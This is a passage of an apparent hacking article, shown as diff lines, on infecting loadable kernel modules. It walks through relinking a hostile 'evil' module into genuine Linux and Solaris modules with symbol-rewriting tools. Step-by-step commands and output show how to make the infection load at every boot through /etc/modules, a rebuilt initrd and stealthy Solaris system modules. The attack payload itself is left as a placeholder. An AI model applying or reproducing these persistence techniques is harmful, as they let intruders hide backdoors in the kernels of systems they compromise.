+used. The two modules (orig.c and evil.c) and the Makefile remain the same.
+
+The first step is to change the init binding from 'local' to 'global'. The
+outcome of the elfchger script can be checked by looking at the readelf's
+output before and after its use. Before running the script readelf outputs:
+
+$ readelf -a orig.ko
+
+...
+
+Section Headers:
+  [Nr] Name        Type     Addr     Off    Size   ES Flg Lk Inf Al
+  ...
+  [16] .symtab     SYMTAB   00000000 0007dc 0001a0 10     17  21  4
+
+...
+
+Symbol table '.symtab' contains 26 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+    ...
+    10: 00000000     0 SECTION LOCAL  DEFAULT   13
+    11: 00000000     0 SECTION LOCAL  DEFAULT   14
+    12: 00000000     0 FILE    LOCAL  DEFAULT  ABS orig.c
+    13: 00000000    25 FUNC    LOCAL  DEFAULT    2 clean
+    14: 00000020    27 FUNC    LOCAL  DEFAULT    2 init
+    ...
+    21: 00000000   372 OBJECT  GLOBAL DEFAULT   10 __this_module
+    22: 00000000    25 FUNC    GLOBAL DEFAULT    2 cleanup_module
+    ...
+
+Let's run the script on the orig.ko file:
+
+$ ./elfchger -g init orig.ko
+[+] Opening orig.ko file...
+[+] Reading Elf header...
+	>> Done!
+[+] Finding ".symtab" section...
+	>> Found at 0x73c
+[+] Finding ".strtab" section...
+	>> Found at 0x764
+[+] Getting symbol' infos:
+	>> Symbol found at 0x8bc
+	>> Index in symbol table: 0xe
+[+] Reordering symbols:
+	>> Starting:
+	>> Moving symbol from f to e
+	>> Moving symbol from 10 to f
+	>> Moving symbol from 11 to 10
+	>> Moving symbol from 12 to 11
+	>> Moving symbol from 13 to 12
+	>> Moving symbol from 14 to 13
+	>> Moving our symbol from 14 to 14
+	>> Last LOCAL symbol: 0x14
+	>> Done!
+[+] Updating symbol' infos:
+	>> Symbol found at 0x91c
+	>> Index in symbol table: 0x14
+	>> Replacing flag 'LOCAL' located at 0x928 with 'GLOBAL'
+[+] Updating symtab infos at 0x73c
+
+Let's see what happened:
+
+$ readelf -a orig.ko
+
+...
+
+Section Headers:
+  [Nr] Name       Type            Addr     Off    Size   ES Flg Lk Inf Al
+  ...
+  [16] .symtab    SYMTAB          00000000 0007dc 0001a0 10     17  20  4
+  [17] .strtab    STRTAB          00000000 00097c 0000a5 00      0   0  1
+
+...
+
+Symbol table '.symtab' contains 26 entries:
+   Num:    Value  Size Type    Bind   Vis      Ndx Name
+    ...
+    18: 00000000   192 OBJECT  LOCAL  DEFAULT    8 ____versions
+    19: 00000060    59 OBJECT  LOCAL  DEFAULT    5 __mod_vermagic5
+    20: 00000020    27 FUNC    GLOBAL DEFAULT    2 init
+    21: 00000000   372 OBJECT  GLOBAL DEFAULT   10 __this_module
+    ...
+
+So as expected:
+
+- the position of init is changed from 14 to 20 in the symbol table;
+- the 'Inf' field in the .symtab header has changed: its current value is
+  20 (19 (last index local symbol) + 1);
+- the binding of init has changed from local to global.
+
+Now we can link together orig.ko and evil.ko:
+
+$ ld -r orig.ko evil.ko -o new.ko
+$ objdump -t new.ko
+
+...
+
+00000040 g     F .text	00000020 evil
+00000000 g     O .gnu.linkonce.this_module	00000174 __this_module
+00000000 g     F .text	00000019 cleanup_module
+00000020 g     F .text	0000001b init_module
+00000000         *UND*	00000000 mcount
+00000000         *UND*	00000000 printk
+00000020 g     F .text	0000001b init
+
+We can notice that the init symbol is no more *UND*. The final step is to
+modify the value of init_module:
+
+$ ./elfchger -s init_module -v 00000040 new.ko
+[+] Opening new.ko file...
+[+] Reading Elf header...
+	>> Done!
+[+] Finding ".symtab" section...
+	>> Found at 0x954
+[+] Finding ".strtab" section...
+	>> Found at 0x97c
+[+] Getting symbol' infos:
+	>> Symbol found at 0xbfc
+	>> Index in symbol table: 0x1e
+[+] Replacing 0x00000020 with 0x00000040... done!
+
+Let's try to load module:
+
+$ mv new.ko orig.ko
+$ sudo insmod orig.ko
+$ dmesg|tail
+...
+[ 2385.342838] Init Original!
+[ 2385.342845] Init Inject!
+
+Cool!! It works!
+
+
+---[ 4.2 Static __init init functions
+
+
+In the previous section it was demonstrated how to inject modules when the
+init function is declared as static. However in some cases the startup
+function in the kernel modules is defined with the __init macro:
+
+static int __init function_name();
+
+The __init macro is used to describe the function as only being required
+during initialisation time. Once initialisation has been performed, the
+kernel will remove this function and release the corresponding memory.
+
+The __init macro is defined in "include/linux/init.h":
+
+/*************************************************************************/
+#define __init               __section(.init.text) __cold notrace
+/*************************************************************************/
+
+The __section macro is defined in "include/linux/compiler.h":
+
+/*************************************************************************/
+#define __section(S)         __attribute__ ((__section__(#S)))
+/*************************************************************************/
+
+While __cold macro is defined in "/include/linux/compiler-gcc*.h":
+
+/*************************************************************************/
+#define __cold               __attribute__((__cold__))
+/*************************************************************************/
+
+When the __init macro is used, a number of GCC attributes are added to the
+function declaration. The __cold attribute informs the compiler to optimize
+it for size instead of speed, because it'll be rarely used. The __section
+attribute informs the compiler to put the text for this function in a new
+section named ".init.text" [5]. How these __init functions are called can
+be checked in "kernel/module.c":
+
+/*************************************************************************/
+static void __init do_initcalls(void)
+{
+     initcall_t *fn;
+
+     for (fn = __early_initcall_end; fn < __initcall_end; fn++)
+          do_one_initcall(*fn);
+
+     /* Make sure there is no pending stuff from the initcall sequence */
+     flush_scheduled_work();
+}
+
+/*************************************************************************/
+
+For each step of the loop inside the do_initcalls() function, an __init
+function set up by the module_init macro is executed. The injection will
+work even if the function is declared with __init.
+
+The module orig is as follows:
+
+/******************************** orig.c *********************************/
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/errno.h>
+
+MODULE_LICENSE("GPL");
+
+static int __init init(void) {
+
+    printk(KERN_ALERT "Init Original!");
+
+    return 0;
+}
+
+static void clean(void) {
+
+    printk(KERN_ALERT "Exit Original!");
+
+    return;
+}
+
+module_init(init);
+module_exit(clean);
+/******************************** EOF ************************************/
+
+After the compilation and as expected, a new .init.text section has
+appeared:
+
+$ objdump -t orig.ko
+...
+00000000 l     F .init.text	00000016 init
+00000000 l     O .modinfo	0000000c __mod_license6
+00000000 l    df *ABS*	00000000 orig.mod.c
+00000020 l     O .modinfo	00000023 __mod_srcversion31
+00000043 l     O .modinfo	00000009 __module_depends
+00000000 l     O __versions	000000c0 ____versions
+00000060 l     O .modinfo	0000003b __mod_vermagic5
+00000000 g     O .gnu.linkonce.this_module	00000174 __this_module
+00000000 g     F .text	00000019 cleanup_module
+00000000 g     F .init.text	00000016 init_module
+00000000         *UND*	00000000 mcount
+00000000         *UND*	00000000 printk
+
+Both init and init_module symbols are part of the .init.text section. This
+new issue can be solved by defining the evil() function as __init:
+
+/******************************** evil.c *********************************/
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/errno.h>
+
+MODULE_LICENSE("GPL");
+
+extern int __init init();
+
+int __init evil(void) {
+
+    init();
+    printk(KERN_ALERT "Init Inject!");
+
+    /* does something */
+
+    return 0;
+}
+/******************************** EOF ************************************/
+
+Both init() and evil() are prefixed with  __init because we need them in
+the same section. The same steps described in section 4.1.3 are then
+performed:
+
+1 - Change the init binding:
+
+$ ./elfchger -g init orig.ko
+[+] Opening orig.ko file...
+[+] Reading Elf header...
+	>> Done!
+[+] Finding ".symtab" section...
+	>> Found at 0x77c
+[+] Finding ".strtab" section...
+	>> Found at 0x7a4
+[+] Getting symbol' infos:
+	>> Symbol found at 0x8fc
+	>> Index in symbol table: 0xf
+[+] Reordering symbols:
+	>> Starting:
+	>> Moving symbol from 10 to f
+	>> Moving symbol from 11 to 10
+	>> Moving symbol from 12 to 11
+	>> Moving symbol from 13 to 12
+	>> Moving symbol from 14 to 13
+	>> Moving symbol from 15 to 14
+	>> Moving our symbol from 15 to 15
+	>> Last LOCAL symbol: 0x15
+	>> Done!
+[+] Updating symbol' infos:
+	[>> Symbol found at 0x95c
+	>> Index in symbol table: 0x15
+	>> Replacing flag 'LOCAL' located at 0x968 with 'GLOBAL'
+[+] Updating symtab infos at 0x77c
+
+
+2 - Link the modules together:
+
+$ ld -r orig.ko evil.ko -o new.ko
+$ objdump -t new.ko
+
+...
+
+00000016 g     F .init.text	0000001b evil
+00000000 g     O .gnu.linkonce.this_module	00000174 __this_module
+00000000 g     F .text	00000019 cleanup_module
+00000000 g     F .init.text	00000016 init_module
+00000000         *UND*	00000000 mcount
+00000000         *UND*	00000000 printk
+00000000 g     F .init.text	00000016 init
+
+
+3 - Change init_module address:
+
+$ ./elfchger -s init_module -v 00000016 new.ko
+[+] Opening new.ko file...
+[+] Reading Elf header...
+	>> Done!
+[+] Finding ".symtab" section...
+	>> Found at 0x954
+[+] Finding ".strtab" section...
+	>> Found at 0x97c
+[+] Getting symbol' infos:
+	>> Symbol found at 0xbec
+	>> Index in symbol table: 0x1f
+[+] Replacing 0x00000000 with 0x00000016... done!
+
+$ objdump -t new.ko
+
+...
+
+00000016 g     F .init.text	0000001b evil
+00000000 g     O .gnu.linkonce.this_module	00000174 __this_module
+00000000 g     F .text	00000019 cleanup_module
+00000016 g     F .init.text	00000016 init_module
+00000000         *UND*	00000000 mcount
+00000000         *UND*	00000000 printk
+00000000 g     F .init.text	00000016 init
+
+
+4 - Load the module in memory:
+
+$ mv new.ko orig.ko
+$ sudo insmod orig.ko
+$ dmesg|tail
+...
+[  323.085545] Init Original!
+[  323.085553] Init Inject!
+
+As expected, it works!
+
+
+---[ 4.3 - What about cleanup_module
+
+
+These methods work fine with the cleanup_module symbol which is called by
+the kernel when the module is unloaded. Never forget to deal with the
+termination function as well because if you don't and if the infected
+module was removed for some reason then your kernel would most likely crash
+(because there would now be invalid references to the module).
+
+The module exit function can be injected simply by altering the symbol
+whose name is specified in elfchger:
+
+$ ./elfchger -s cleanup_module -v address_evil_fn new.ko
+
+In this way, when the module is unloaded, the evil() function will be
+invoked instead of the clean() one. You may also need to deal with binding
+issues and __exit attribute but the adaptation of the previous method is
+straightforward.
+
+
+---[ 5 - Real life example
+
+
+This chapter will show the usage of the present method in a real life
+example. Let's suppose that evil.ko is a working backdoor. We want to
+inject it into a kernel module not used by any other kernel module. This
+test was done on Ubuntu 11.10 (x86) with a 3.0.0 kernel.
+
+$ uname -a
+Linux ubuntu 3.0.0-15-generic #26-Ubuntu SMP Fri Jan 20 15:59:53 UTC 2012
+i686 i686 i386 GNU/Linux
+
+Let's begin by checking which modules to infect by using the lsmod command:
+
+$ lsmod
+
+Module                  Size  Used by
+serio_raw               4022  0
+lp                      7342  0
+snd_seq_midi            4588  0
+usbhid                 36882  0
+binfmt_misc             6599  1
+agpgart                32011  1 drm
+snd_intel8x0           25632  2
+
+...
+
+libahci                21667  3 ahci
+
+The command output shows that some of the modules are not used by any
+other module. These modules can be unloaded safely and then they can be
+infected with our backdoor using the method presented above. This chapter
+is divided into two sections in which I'll describe two techniques to load
+the module when the operating system is booted:
+
+1 - Infect a kernel module (or simply add a new one) on
+    /etc/modprobe.preload (Fedora, etc.) or in /etc/modules on
+    Debian/Ubuntu.
+
+2 - Backdoor initrd.
+
+
+---[ 5.1 - Infecting a kernel module in /etc/modules
+
+First of all, we have to know which modules are in the /etc/modules file:
+
+$ cat /etc/modules
+# /etc/modules: kernel modules to load at boot time.
+...
+lp
+
+As described in the previous section, this module (lp.ko) can be unloaded
+safely and then infected with our backdoor.
+
+$ find / -name lp.ko
+...
+/lib/modules/3.0.0-15-generic/kernel/drivers/char/lp.ko
+...
+
+$ cd /lib/modules/3.0.0-15-generic/kernel/drivers/char
+
+Next, we check which function is called by the init_module:
+
+$ objdump -t lp.ko |grep -e ".init.text"
+00000000 l     F .init.text 00000175 lp_init
+00000175 l     F .init.text 000000ae lp_init_module
+00000000 l    d  .init.text 00000000 .init.text
+00000175 g     F .init.text 000000ae init_module
+
+We want to infect the lp_init_module() function, so the evil module will
+be coded in the following way:
+
+/****************** evil.c ***********************************************/
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/errno.h>
+
+MODULE_LICENSE("GPL");
+
+extern int __init lp_init_module();
+
+int __init evil(void) {
+
+    printk(KERN_ALERT "Init Inject! Lp");
+    lp_init_module();
+
+    /* does something */
+
+    return 0;
+}
+/****************** EOF **************************************************/
+
+Since the lp_init_module function is static we need to change its binding
+type to global.
+
+$ ./elfchger -g lp_init_module lp.ko
+[+] Opening lp.ko file...
+[+] Reading Elf header...
+    >> Done!
+[+] Finding ".symtab" section...
+    >> Found at 0x28a0
+[+] Finding ".strtab" section...
+    >> Found at 0x28c8
+[+] Getting symbol' infos:
+    >> Symbol found at 0x2b30
+    >> Index in symbol table: 0x24
+[+] Reordering symbols:
+    >> Starting:
+    >> Moving symbol from 25 to 24
+    >> Moving symbol from 26 to 25
+    >> Moving symbol from 27 to 26
+    >> Moving symbol from 28 to 27
+    >> Moving symbol from 29 to 28
+    >> Moving symbol from 2a to 29
+    >> Moving symbol from 2b to 2a
+    >> Moving symbol from 2c to 2b
+    >> Moving symbol from 2d to 2c
+    >> Moving symbol from 2e to 2d
+    >> Moving symbol from 2f to 2e
+    >> Moving symbol from 30 to 2f
+    >> Moving symbol from 31 to 30
+    >> Moving symbol from 32 to 31
+    >> Moving symbol from 33 to 32
+    >> Moving symbol from 34 to 33
+    >> Moving symbol from 35 to 34
+    >> Moving symbol from 36 to 35
+    >> Moving symbol from 37 to 36
+    >> Moving symbol from 38 to 37
+    >> Moving symbol from 39 to 38
+    >> Moving symbol from 3a to 39
+    >> Moving symbol from 3b to 3a
+    >> Moving symbol from 3c to 3b
+    >> Moving symbol from 3d to 3c
+    >> Moving our symbol from 36 to 3d
+    >> Last LOCAL symbol: 0x3d
+    >> Done!
+[+] Updating symbol' infos:
+    >> Symbol found at 0x2cc0
+    >> Index in symbol table: 0x3d
+    >> Replacing flag 'LOCAL' located at 0x2ccc with 'GLOBAL'
+[+] Updating symtab infos at 0x28a0
+
+The two modules can be now linked together:
+
+$ ld -r lp.ko evil.ko -o new.ko
+$ objdump -t new.ko |grep -e init_module -e evil
+00000000 l    df *ABS*  00000000 evil.c
+00000000 l    df *ABS*  00000000 evil.mod.c
+00000223 g     F .init.text 00000019 evil
+00000175 g     F .init.text 000000ae lp_init_module
+00000175 g     F .init.text 000000ae init_module
+
+Now the relative address of init_module has to be changed to 0000021a:
+
+$ ./elfchger -s init_module -v 00000223 new.ko
+[+] Opening new.ko file...
+[+] Reading Elf header...
+    >> Done!
+[+] Finding ".symtab" section...
+    >> Found at 0x2a34
+[+] Finding ".strtab" section...
+    >> Found at 0x2a5c
+[+] Getting symbol' infos:
+    >> Symbol found at 0x39a4
+    >> Index in symbol table: 0x52
+[+] Replacing 0x00000175 with 0x00000223... done!
+
+The new.ko module must be renamed to lp.ko and then loaded:
+
+$ mv new.ko lp.ko
+$ sudo rmmod lp
+$ sudo insmod lp.ko
+$ dmesg|tail
+...
+$ dmesg
+....
+[ 1033.418723] Init Inject! Lp
+[ 1033.431131] lp0: using parport0 (interrupt-driven).
+
+From now on, every time the system is booted, the infected lp kernel
+module will be loaded instead of the original one.
+
+
+---[ 5.2 - Backdooring initrd
+
+It is also possible to backdoor a module in the initrd image. The target
+module has to be extracted out of the image, backdoored and then reinserted
+back. The target module used throughout this example will be usbhid.ko.
+
+In order to inject a kernel module into the initrd image, we'll follow the
+guide in [9], which explains how to add a new module inside the initrd
+image. According to [9], the initrd image can be copied from /boot to a
+target directory (e.g. /tmp) so we can easily work on it:
+
+$ cp /boot/initrd.img-2.6.35-22-generic /tmp/
+$ cd /tmp
+
+The image can be now decompressed using the gzip tool:
+
+$ mv initrd.img-2.6.35-22-generic initrd.img-2.6.35-22-generic.gz
+$ gzip -d initrd.img-2.6.35-22-generic.gz
+$ mkdir initrd
+$ cd initrd/
+$ cpio -i -d -H newc -F ../initrd.img-2.6.35-22-generic \
+--no-absolute-filenames
+50522 blocks
+
+The location of the usbhid.ko module has then to be found inside the kernel
+tree:
+
+$ find ./ -name usbhid
+./lib/modules/2.6.35-22-generic/kernel/drivers/hid/usbhid
+$ cd lib/modules/2.6.35-22-generic/kernel/drivers/hid/usbhid
+
+At this point it can be easily infected with our evil module:
+
+$ objdump -t usbhid.ko |grep -e ".init.text"
+00000000 l     F .init.text	000000c3 hid_init
+00000000 l    d  .init.text	00000000 .init.text
+00000000 g     F .init.text	000000c3 init_module
+000000c3 g     F .init.text	00000019 hiddev_init
+
+Since we want to infect the hid_init() function, the evil module will be
+coded in the following way:
+
+/****************** evil.c ***********************************************/
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/errno.h>
+
+MODULE_LICENSE("GPL");
+
+extern int __init hid_init();
+
+int __init evil(void) {
+
+    hid_init();
+    printk(KERN_ALERT "Init Inject! Usbhid");
+
+    /* does something */
+
+    return 0;
+}
+/****************** EOF **************************************************/
+
+$ ./elfchger -g hid_init usbhid.ko
+[+] Opening usbhid.ko file...
+[+] Reading Elf header...
+	>> Done!
+[+] Finding ".symtab" section...
+	>> Found at 0xa24c
+[+] Finding ".strtab" section...
+	>> Found at 0xa274
+[+] Getting symbol' infos:
+	>> Symbol found at 0xa4dc
+	>> Index in symbol table: 0x24
+[+] Reordering symbols:
+	>> Starting:
+	>> Moving symbol from 25 to 24
+...
+	>> Moving symbol from a6 to a5
+	>> Moving our symbol from 36 to a6
+	>> Last LOCAL symbol: 0xa6
+	>> Done!
+[+] Updating symbol' infos:
+	>> Symbol found at 0xacfc
+	>> Index in symbol table: 0xa6
+	>> Replacing flag 'LOCAL' located at 0xad08 with 'GLOBAL'
+[+] Updating symtab infos at 0xa24c
+
+$ ld -r usbhid.ko evil.ko -o new.ko
+$ objdump -t new.ko | grep -e init_module -e evil
+00000000 l    df *ABS*	00000000 evil.c
+00000000 l    df *ABS*	00000000 evil.mod.c
+000000dc g     F .init.text	0000001b evil
+00000000 g     F .init.text	000000c3 init_module
+
+
+$ ./elf -s init_module -v 000000dc new.ko
+[+] Opening new.ko file...
+[+] Reading Elf header...
+	>> Done!
+[+] Finding ".symtab" section...
+	>> Found at 0xa424
+[+] Finding ".strtab" section...
+	>> Found at 0xa44c
+[+] Getting symbol' infos:
+	>> Symbol found at 0xd2dc
+	>> Index in symbol table: 0xd5
+[+] Replacing 0x00000000 with 0x000000dc... done!
+
+$ mv new.ko usbhid.ko
+
+Once the target module has been infected with the evil one, we must
+recreate the initrd image:
+
+$ cd /tmp/initrd/
+$ find . | cpio -o -H newc | gzip > /tmp/initrd.img-2.6.35-22-generic
+50522 blocks
+$ cp ../initrd.img-2.6.35-22-generic /boot/
+
+From now on, every time the system is booted, the infected usbhid kernel
+module will be loaded instead of the original one.
+
+
+---[ 6 - What about other systems?
+
+
+In this last chapter we will see how the presented infection method can
+applied to other operating systems, specifically Solaris, FreeBSD, NetBSD
+and OpenBSD. It will be shown that, even if the method is different from
+that used on Linux, infection is still possible.
+
+
+---[ 6.1 - Solaris
+
+On Solaris systems infecting a kernel module is simpler than on Linux ones.
+Changing the symbol's name in the .strtab ELF section is sufficient,
+similarly to truff's original method for the Linux kernel 2.4.* versions.
+The method has been tested on Solaris 10:
+
+# uname -a
+SunOS unknown 5.10 Generic_142910-17 i86pc i386 i86pc
+
+
+---[ 6.1.1 - A basic example
+
+
+The orig.c and evil.c source codes are as follows:
+
+/******************************** orig.c *********************************/
+#include <sys/ddi.h>
+#include <sys/sunddi.h>
+#include <sys/modctl.h>
+
+extern struct mod_ops mod_miscops;
+
+static struct modlmisc modlmisc =
+{
+    &mod_miscops,
+    "original",
+};
+
+static struct modlinkage modlinkage =
+{
+    MODREV_1,
+    (void *) &modlmisc,
+    NULL
+};
+
+int _init(void) {
+
+    int i;
+
+    if ((i = mod_install(&modlinkage)) != 0)
+        cmn_err(CE_NOTE, "Can't load module!\n");
+    else
+        cmn_err(CE_NOTE, "Init Original!");
+
+    return i;
+}
+
+int _info(struct modinfo *modinfop) {
+
+    return (mod_info(&modlinkage, modinfop));
+}
+
+int _fini(void) {
+
+    int i;
+
+    if ((i = mod_remove(&modlinkage)) != 0)
+        cmn_err(CE_NOTE, "Can't remove module!\n");
+    else
+        cmn_err(CE_NOTE, "Exit Original!");
+
+    return i;
+}
+/******************************** EOF ************************************/
+
+/******************************** evil.c *********************************/
+#include <sys/ddi.h>
+#include <sys/sunddi.h>
+
+#include <sys/modctl.h>
+
+extern int _evil(void);
+
+int _init(void) {
+
+    cmn_err(CE_NOTE, "Inject!");
+
+    _evil();
+
+    return 0;
+}
+/******************************** EOF ************************************/
+
+The _init function is called at module initialisation, while the _fini one
+is called at module cleanup. The _info function prints information about
+the module when the "modinfo" command is invoked. The two modules can be
+compiled using the following commands:
+
+# /usr/sfw/bin/gcc -g -D_KERNEL -DSVR4 -DSOL2 -DDEBUG -O2 -c orig.c
+# /usr/sfw/bin/gcc -g -D_KERNEL -DSVR4 -DSOL2 -DDEBUG -O2 -c evil.c
+
+Let's have a look at the orig.o ELF file by using the "elfdump" command:
+
+# /usr/ccs/bin/elfdump -s orig.o
+
+Symbol Table Section:  .symtab
+    index    value      size      type bind oth ver shndx     name
+      [0]  0x00000000 0x00000000  NOTY LOCL  D    0 UNDEF
+      [1]  0x00000000 0x00000000  FILE LOCL  D    0 ABS       orig.c
+      [2]  0x00000000 0x00000000  SECT LOCL  D    0 .text
+
+      ...
+
+     [16]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     mod_miscops
+     [17]  0x00000000 0x0000004d  FUNC GLOB  D    0 .text     _init
+     [18]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     mod_install
+     [19]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     cmn_err
+     [20]  0x00000050 0x00000018  FUNC GLOB  D    0 .text      _info
+     [21]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     mod_info
+     [22]  0x00000068 0x0000004d  FUNC GLOB  D    0 .text     _fini
+     [23]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     mod_remove
+
+The _evil() function must be called instead of _init when the module is
+loaded. To achieve this, the following steps have to be performed:
+
+- Change the _init symbol name to _evil in orig.o;
+- Link the two modules together;
+
+This way, the kernel will load the _init() function defined in evil.c which
+in turn will call the _evil() function (the old _init()) in order to
+maintain the correct behaviour of the orig module. It is possible to change
+a symbol name using the 'objcopy' tool. In fact the '--redefine-sym' option
+can be used to give an arbitrary name to the specified symbol:
+
+# /usr/sfw/bin/gobjcopy --redefine-sym _init=_evil orig.o
+# /usr/ccs/bin/elfdump -s orig.o
+
+Symbol Table Section:  .symtab
+     index    value      size      type bind oth ver shndx      name
+       [0]  0x00000000 0x00000000  NOTY LOCL  D    0 UNDEF
+       [1]  0x00000000 0x00000000  FILE LOCL  D    0 ABS        orig.c
+       [2]  0x00000000 0x00000000  SECT LOCL  D    0 .text
+
+       ...
+
+      [16]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF      mod_miscops
+      [17]  0x00000000 0x0000004d  FUNC GLOB  D    0 .text      _evil
+      [18]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF      mod_install
+      [19]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF      cmn_err
+      [20]  0x00000050 0x00000018  FUNC GLOB  D    0 .text      _info
+      [21]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF      mod_info
+      [22]  0x00000068 0x0000004d  FUNC GLOB  D    0 .text      _fini
+      [23]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF      mod_remove
+
+
+By checking with "elfdump" it is possible to verify if the script properly
+performed its job:
+
+# /usr/ccs/bin/elfdump -s orig.o
+
+Symbol Table Section:  .symtab
+     index    value      size      type bind oth ver shndx     name
+       [0]  0x00000000 0x00000000  NOTY LOCL  D    0 UNDEF
+       [1]  0x00000000 0x00000000  FILE LOCL  D    0 ABS       orig.c
+       [2]  0x00000000 0x00000000  SECT LOCL  D    0 .text
+
+       ...
+
+      [16]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     mod_miscops
+      [17]  0x00000000 0x0000004d  FUNC GLOB  D    0 .text     _evil
+      [18]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     mod_install
+      [19]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     cmn_err
+      [20]  0x00000050 0x00000018  FUNC GLOB  D    0 .text     _info
+      [21]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     mod_info
+      [22]  0x00000068 0x0000004d  FUNC GLOB  D    0 .text     _fini
+      [23]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     mod_remove
+
+The _init symbol name has been modified to _evil. The modules are then
+linked together using the "ld" command:
+
+# ld -r orig.o evil.o -o new.o
+
+The new.o elf file dump follows:
+
+# /usr/ccs/bin/elfdump -s new.o
+
+Symbol Table Section:  .symtab
+     index    value      size      type bind oth ver shndx     name
+       [0]  0x00000000 0x00000000  NOTY LOCL  D    0 UNDEF
+       [1]  0x00000000 0x00000000  FILE LOCL  D    0 ABS       new.o
+       [2]  0x00000000 0x00000000  SECT LOCL  D    0 .text
+
+       ...
+
+      [27]  0x00000000 0x00000000  FILE LOCL  D    0 ABS       evil.c
+      [28]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     mod_install
+      [29]  0x00000000 0x0000004d  FUNC GLOB  D    0 .text     _evil
+      [30]  0x00000068 0x0000004d  FUNC GLOB  D    0 .text     _fini
+      [31]  0x00000050 0x00000018  FUNC GLOB  D    0 .text     _info
+      [32]  0x000000b8 0x0000001e  FUNC GLOB  D    0 .text     _init
+      [33]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     mod_miscops
+      [34]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     mod_info
+      [35]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     mod_remove
+      [36]  0x00000000 0x00000000  NOTY GLOB  D    0 UNDEF     cmn_err
+
+To summarize, the _init symbol is referring to the function defined in
+evil.c, while the _evil symbol is referring to the old _init defined in
+orig.c that we have just renamed to _evil.
+
+Now, the last step is to rename the new.o into orig.o and to load it:
+
+# mv new.o orig.o
+# modload orig.o
+# tail /var/adm/messages
+...
+May ... orig.o: [ID 343233 kern.notice] NOTICE: Inject!
+May ... orig.o: [ID 662037 kern.notice] NOTICE: Init Original!
+
+As you can see the module is successfully infected.
+
+# modinfo | grep orig.o
+247 fa9e6eac    160   -   1  orig.o (original)
+
+# modunload -i 247
+
+
+---[ 6.1.2 - Playing with OS modules
+
+
+This section will explain how to infect a system kernel module. The method
+remains the same but it will be necessary to make minor changes to the evil
+module in order to correctly load it to memory. The evil module will be
+injected into the audio driver.  First of all, the module has to be
+unloaded:
+
+# modinfo | grep lx_audio
+216 f99e40e0   2614 242   1  lx_audio (linux audio driver 'lx_audio' 1)
+# modunload -i 216
+
+Now, it is possible to play with it:
+
+# /usr/ccs/bin/elfdump -s lx_audio|grep _init
+    [64]  0x000020c2 0x00000011  FUNC GLOB  D    0 .text       _init
+   [118]  0x00000000 0x00000000  FUNC GLOB  D    0 UNDEF       mutex_init
+
+# /usr/sfw/bin/gobjcopy --redefine-sym _init=_evil lx_audio
+# ld -r evil.o lx_audio -o new
+# /usr/ccs/bin/elfdump -s new|grep _evil
+      [77]  0x000020de 0x00000011  FUNC GLOB  D    0 .text          _evil
+
+# mv new lx_audio
+# modload lx_audio
+
+# tail /var/adm/messages
+...
+
+Dec 29 17:00:19 spaccio lx_audio: ... NOTICE: Inject!
+
+Great, it works!
+
+
+---[ 6.1.3 - Keeping it stealthy
+
+
+According to the /etc/system file, the kernel modules that are loaded at
+boot time are located in the /kernel and /usr/kernel directories. The
+platform-dependent modules reside in the /platform directory. In this
+example I'll infect the usb kernel module: usba.
+
+First of all the kernel module's position in the filesystem must be
+located:
+
+# find /kernel -name usba
+/kernel/misc/amd64/usba
+/kernel/misc/usba
+/kernel/kmdb/amd64/usba
+/kernel/kmdb/usba
+
+# cd /kernel/misc/usba
+
+# /usr/ccs/bin/elfdump -s usba|grep _init
+     ...
+
+     [291]  0x00017354 0x0000004c  FUNC LOCL  D    0 .text     ugen_ds_init
+     [307]  0x00017937 0x000000e3  FUNC LOCL  D    0 .text     ugen_pm_init
+     [347]  0x00000fd4 0x00000074  FUNC GLOB  D    0 .text     _init
+     ....
+     [655]  0x00000000 0x00000000  FUNC GLOB  D    0 UNDEF     rw_init
+     [692]  0x00000000 0x00000000  FUNC GLOB  D    0 UNDEF     cv_init
+
+Now it is possible to change the _init symbol name to _evil.
+
+# /usr/sfw/bin/gobjcopy --redefine-sym _init=_evil usba
+# /usr/ccs/bin/elfdump -s usba|grep _evil
+     [348]  0x00000fd4 0x00000074  FUNC GLOB  D    0 .text     _evil
+
+# ld -r evil.o usba -o new
+
+Now we have only to rename the module to its original name:
+
+# mv new usba
+
+From now on, every time the system is booted, the infected usba kernel
+module will be loaded instead of the original one.
+
+
+---[ 6.2 - *BSD
+
+
+---[ 6.2.1 - FreeBSD - NetBSD - OpenBSD
+
+
+The conclusions made by truff are still valid in the newest versions of
+these operating systems. On FreeBSD, kernel modules are shared objects, so
+the proposed method doesn't work because the kernel modules can't be
+partially linked. On NetBSD and OpenBSD what we have to do is simply to
+change the entry point of the kernel module when it is loaded. So our
+function will be invoked instead the original one.
+
+
+---[ 7 - Conclusions
+
+
+In this paper a new module injection method was introduced to be used with
+Linux kernel 2.6.x/3.0.x series. Several methods, from simple to more
+sophisticated were presented to inject external code into kernel modules.
+
+It was also explained how the method (with some changes) can be
+successfully applied to a wide range of operating systems. I hope you'll
+have fun with it and that you enjoyed this paper!
+
+Bye.
+
+
+---[ 8 - References
+
+
+[1] Infecting loadable kernel modules
+    http://www.phrack.com/issues.html?issue=61&id=10#article
+
+[2] EXECUTABLE AND LINKABLE FORMAT (ELF)
